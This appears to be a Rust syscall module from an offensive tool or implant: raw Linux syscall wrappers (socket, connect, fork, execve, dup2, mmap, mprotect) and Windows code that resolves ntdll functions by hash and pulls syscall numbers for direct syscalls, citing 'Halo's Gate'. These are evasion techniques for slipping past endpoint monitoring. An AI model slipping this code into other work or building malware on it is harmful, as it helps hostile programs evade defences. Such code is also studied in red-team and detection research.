use core::arch::asm;

// Linux x86_64 Syscall Numbers
#[cfg(not(target_os = "windows"))]
pub const SYS_READ: usize = 0;
#[cfg(not(target_os = "windows"))]
pub const SYS_WRITE: usize = 1;
#[cfg(not(target_os = "windows"))]
pub const SYS_OPEN: usize = 2;
#[cfg(not(target_os = "windows"))]
pub const SYS_CLOSE: usize = 3;
#[cfg(not(target_os = "windows"))]
pub const SYS_NANOSLEEP: usize = 35;
#[cfg(not(target_os = "windows"))]
pub const SYS_SOCKET: usize = 41;
#[cfg(not(target_os = "windows"))]
pub const SYS_CONNECT: usize = 42;
#[cfg(not(target_os = "windows"))]
pub const SYS_SENDTO: usize = 44; // sendto/write
#[cfg(not(target_os = "windows"))]
pub const SYS_EXIT: usize = 60;
#[cfg(not(target_os = "windows"))]
pub const SYS_PIPE: usize = 22;
#[cfg(not(target_os = "windows"))]
pub const SYS_DUP2: usize = 33;
#[cfg(not(target_os = "windows"))]
pub const SYS_FORK: usize = 57;
#[cfg(not(target_os = "windows"))]
pub const SYS_EXECVE: usize = 59;

#[cfg(not(target_os = "windows"))]
#[inline(always)]
pub unsafe fn syscall0(n: usize) -> usize {
    let ret: usize;
    asm!(
        "syscall",
        inlateout("rax") n => ret,
        out("rcx") _,
        out("r11") _,
        options(nostack, preserves_flags)
    );
    ret
}

#[cfg(not(target_os = "windows"))]
#[inline(always)]
pub unsafe fn syscall1(n: usize, a1: usize) -> usize {
    let ret: usize;
    asm!(
        "syscall",
        inlateout("rax") n => ret,
        in("rdi") a1,
        out("rcx") _,
        out("r11") _,
        options(nostack, preserves_flags)
    );
    ret
}

#[cfg(not(target_os = "windows"))]
#[inline(always)]
pub unsafe fn syscall2(n: usize, a1: usize, a2: usize) -> usize {
    let ret: usize;
    asm!(
        "syscall",
        inlateout("rax") n => ret,
        in("rdi") a1,
        in("rsi") a2,
        out("rcx") _,
        out("r11") _,
        options(nostack, preserves_flags)
    );
    ret
}

#[cfg(not(target_os = "windows"))]
pub const SYS_MMAP: usize = 9;
#[cfg(not(target_os = "windows"))]
pub const SYS_MPROTECT: usize = 10;

#[cfg(not(target_os = "windows"))]
#[inline(always)]
pub unsafe fn syscall6(n: usize, a1: usize, a2: usize, a3: usize, a4: usize, a5: usize, a6: usize) -> usize {
    let ret: usize;
    asm!(
        "syscall",
        inlateout("rax") n => ret,
        in("rdi") a1,
        in("rsi") a2,
        in("rdx") a3,
        in("r10") a4,
        in("r8") a5,
        in("r9") a6,
        out("rcx") _,
        out("r11") _,
        options(nostack, preserves_flags)
    );
    ret
}

#[cfg(not(target_os = "windows"))]
pub unsafe fn sys_mmap(addr: usize, len: usize, prot: i32, flags: i32, fd: i32, offset: usize) -> usize {
    syscall6(SYS_MMAP, addr, len, prot as usize, flags as usize, fd as usize, offset)
}

#[cfg(not(target_os = "windows"))]
pub unsafe fn sys_mprotect(addr: usize, len: usize, prot: i32) -> usize {
    syscall3(SYS_MPROTECT, addr, len, prot as usize)
}

#[cfg(not(target_os = "windows"))]
#[inline(always)]
pub unsafe fn syscall3(n: usize, a1: usize, a2: usize, a3: usize) -> usize {
    let ret: usize;
    asm!(
        "syscall",
        inlateout("rax") n => ret,
        in("rdi") a1,
        in("rsi") a2,
        in("rdx") a3,
        out("rcx") _,
        out("r11") _,
        options(nostack, preserves_flags)
    );
    ret
}

#[cfg(not(target_os = "windows"))]
pub unsafe fn sys_socket(domain: i32, type_: i32, protocol: i32) -> usize {
    syscall3(
        SYS_SOCKET,
        domain as usize,
        type_ as usize,
        protocol as usize,
    )
}

#[cfg(not(target_os = "windows"))]
pub unsafe fn sys_connect(sockfd: usize, addr: *const u8, addrlen: u32) -> usize {
    syscall3(SYS_CONNECT, sockfd, addr as usize, addrlen as usize)
}

#[cfg(not(target_os = "windows"))]
pub unsafe fn sys_write(fd: usize, buf: *const u8, count: usize) -> usize {
    syscall3(SYS_WRITE, fd, buf as usize, count)
}

#[cfg(not(target_os = "windows"))]
pub unsafe fn sys_read(fd: usize, buf: *mut u8, count: usize) -> usize {
    syscall3(SYS_READ, fd, buf as usize, count)
}

#[cfg(not(target_os = "windows"))]
pub unsafe fn sys_close(fd: usize) -> usize {
    syscall1(SYS_CLOSE, fd)
}

#[cfg(not(target_os = "windows"))]
pub unsafe fn sys_nanosleep(req: *const Timespec, rem: *mut Timespec) -> usize {
    syscall2(SYS_NANOSLEEP, req as usize, rem as usize)
}

#[cfg(not(target_os = "windows"))]
pub unsafe fn sys_exit(code: i32) -> ! {
    syscall1(SYS_EXIT, code as usize);
    loop {}
}

#[cfg(not(target_os = "windows"))]
pub unsafe fn sys_fork() -> isize {
    syscall0(SYS_FORK) as isize
}

#[cfg(not(target_os = "windows"))]
pub unsafe fn sys_execve(filename: *const u8, argv: *const *const u8, envp: *const *const u8) -> isize {
    syscall3(SYS_EXECVE, filename as usize, argv as usize, envp as usize) as isize
}

#[cfg(not(target_os = "windows"))]
pub unsafe fn sys_pipe(pipefd: *mut i32) -> isize {
    syscall1(SYS_PIPE, pipefd as usize) as isize
}

#[cfg(not(target_os = "windows"))]
pub unsafe fn sys_dup2(oldfd: i32, newfd: i32) -> isize {
    syscall2(SYS_DUP2, oldfd as usize, newfd as usize) as isize
}

#[repr(C)]
pub struct Timespec {
    pub tv_sec: i64,
    pub tv_nsec: i64,
}

#[repr(C)]
pub struct SockAddrIn {
    pub sin_family: u16,
    pub sin_port: u16,
    pub sin_addr: u32,
    pub sin_zero: [u8; 8],
}

// -----------------------------------------------------------------------------
// Windows Implementation
// -----------------------------------------------------------------------------

#[cfg(target_os = "windows")]
use crate::utils::api_resolver::{hash_str, resolve_function};

#[cfg(target_os = "windows")]
pub unsafe fn get_ssn(function_hash: u32) -> u16 {
    // 1. Get ntdll base implicitly via resolve_function (which walks all modules)
    // Note: resolve_function takes module_hash.
    let ntdll_hash = hash_str(b"ntdll.dll");
    let addr = resolve_function(ntdll_hash, function_hash);

    if addr.is_null() {
        return 0;
    }

    // 2. Read SSN
    // Pattern: mov r10, rcx; mov eax, <SSN>
    // Bytes: 4c 8b d1 b8 <SSN_LOW> <SSN_HIGH> 00 00
    let p = addr as *const u8;
    if *p == 0x4c && *p.add(1) == 0x8b && *p.add(2) == 0xd1 && *p.add(3) == 0xb8 {
        let ssn_low = *p.add(4) as u16;
        let ssn_high = *p.add(5) as u16;
        return (ssn_high << 8) | ssn_low;
    }

    // Fallback: Check neighbors (Halo's Gate) - Simplified stub
    0
}

#[cfg(target_os = "windows")]
#[inline(always)]
pub unsafe fn do_syscall(ssn: u16, w1: usize, w2: usize, w3: usize, w4: usize) -> usize {
    let ret: usize;
    asm!(
    "mov r10, rcx",
    "syscall",
    in("eax") ssn as u32,
    in("rcx") w1,
    in("rdx") w2,
    in("r8")  w3,
    in("r9")  w4,
    lateout("rax") ret,
    out("r10") _,
    out("r11") _,
            options(nostack)
        );
    ret
}

#[cfg(target_os = "windows")]
pub unsafe fn sys_exit(code: i32) -> ! {
    let ntdll_hash = hash_str(b"ntdll.dll");
    let term_hash = hash_str(b"NtTerminateProcess");
    let ssn = get_ssn(term_hash);
    if ssn != 0 {
        // Handle -1 (Current Process)
        do_syscall(ssn, 0xFFFFFFFFFFFFFFFF, code as usize, 0, 0);
    }

    loop {}
}
